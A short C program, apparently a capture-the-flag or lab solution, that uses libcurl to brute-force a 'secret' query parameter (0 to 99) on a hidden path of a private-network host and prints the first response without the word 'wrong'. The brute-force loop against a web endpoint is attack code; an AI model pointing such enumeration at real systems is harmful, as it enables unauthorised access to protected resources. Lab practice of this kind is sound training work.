#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

//apt-get install libcurl4-gnutls-dev

size_t got_data(char *buffer, size_t itemsize, size_t nitems, void *data)
{
    size_t bytes = itemsize * nitems;
    int *ret = (int *)data;

    if (strstr(buffer, "wrong") == NULL)
    {
        printf("%s", buffer);
        *ret = 1;
    }

    return bytes;
}

int main(void)
{
    char data[100] = {0};
    CURL *curl = curl_easy_init();
    int ret = 0;

    if (!curl)
    {
        fprintf(stderr, "init failed\n");
        return EXIT_FAILURE;
    }

    //set options
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, got_data);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&ret);

    for (int i = 0; i < 100; i++)
    {
        snprintf(data, 100, "10.10.142.253/th1s_1s_h1dd3n/?secret=%d", i);
        curl_easy_setopt(curl, CURLOPT_URL, data);

        CURLcode result = curl_easy_perform(curl);
        if (result != CURLE_OK)
        {
            fprintf(stderr, "download problem: %s\n", curl_easy_strerror(result));
        }

        if (ret)
            break;
    }

    //perform out action

    curl_easy_cleanup(curl);
    return 0;
}
